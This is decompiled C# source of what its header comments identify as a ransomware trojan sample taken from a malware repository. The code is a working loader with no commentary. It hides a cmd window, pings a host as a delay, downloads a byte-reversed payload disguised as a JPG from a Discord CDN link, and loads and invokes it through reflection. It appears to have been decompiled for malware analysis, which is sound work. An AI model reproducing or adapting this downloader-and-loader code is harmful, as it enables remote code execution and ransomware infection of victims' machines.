// Decompiled with JetBrains decompiler
// Type: Dajrx.Internet
// Assembly: Pgmxmmw, Version=22.1.3.848, Culture=neutral, PublicKeyToken=null
// MVID: 31D213B1-7E41-4548-A3E4-AAC3E98012BD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-532c1adc08f46f8c30a9e787fd6c59350c94966b5eb8b7549d32e2e0af7600e4.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Dajrx
{
  internal class Internet
  {
    internal static void Config()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/c ping yahoo.com",
        WindowStyle = ProcessWindowStyle.Hidden
      });
      Thread.Sleep(TimeSpan.FromSeconds(20.0));
    }

    internal static void App()
    {
      AppDomain target = (AppDomain) typeof (AppDomain).GetProperty("CurrentDomain").GetValue((object) null, (object[]) null);
      Assembly assembly = (Assembly) target.GetType().InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) target, new object[1]
      {
        (object) Internet.Png
      });
    }

    internal static byte[] Png
    {
      get
      {
        byte[] png = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/913584216825028612/945612893792124968/Pgmxmmw.jpg").GetResponse().GetResponseStream()).ReadBytes(84155470);
        typeof (Array).GetMethod("Reverse", new Type[1]
        {
          typeof (Array)
        }).Invoke((object) null, new object[1]
        {
          (object) png
        });
        return png;
      }
    }

    internal static bool Info()
    {
      foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
      {
        foreach (Type type in assembly.GetTypes())
        {
          foreach (MethodInfo method in type.GetMethods())
          {
            if (method.Name == "Rlppmviasyd")
              return (bool) method.Invoke((object) null, (object[]) null);
          }
        }
      }
      return false;
    }
  }
}
